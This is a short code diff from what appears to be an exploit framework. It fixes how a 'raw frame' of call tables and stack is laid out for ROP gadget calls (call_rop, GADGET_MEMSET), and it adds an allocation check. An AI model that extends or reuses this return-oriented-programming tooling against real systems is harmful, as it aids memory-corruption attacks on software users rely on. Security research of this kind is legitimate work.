@@ -67,10 +67,15 @@ function borrowThreadScheduling() {
 // Returns: { frame, size, count }
 function buildRawFrame(calls) {
     var count = calls.length;
-    var tables = 0x1000;
+    // Result slots occupy [FRAME_RESULT, FRAME_RESULT + count*8); the call
+    // tables must start past them — with count > 255 the old fixed 0x1000
+    // table base let result slots clobber table 0's next-pointer.
+    var tables = _frameAlignPage(FRAME_RESULT + count * 8);
     var stack = _frameAlignPage(tables + count * 0x100) + 0x10000;
     var size = _frameAlignPage(stack + count * FRAME_STEP + 0x4000);
     var frame = allocPage(size);
+    if (!frame)
+        throw new Error("buildRawFrame: allocPage(" + size + ") failed");
 
     call_rop(GADGET_MEMSET, frame, 0n, BigInt(size));
 
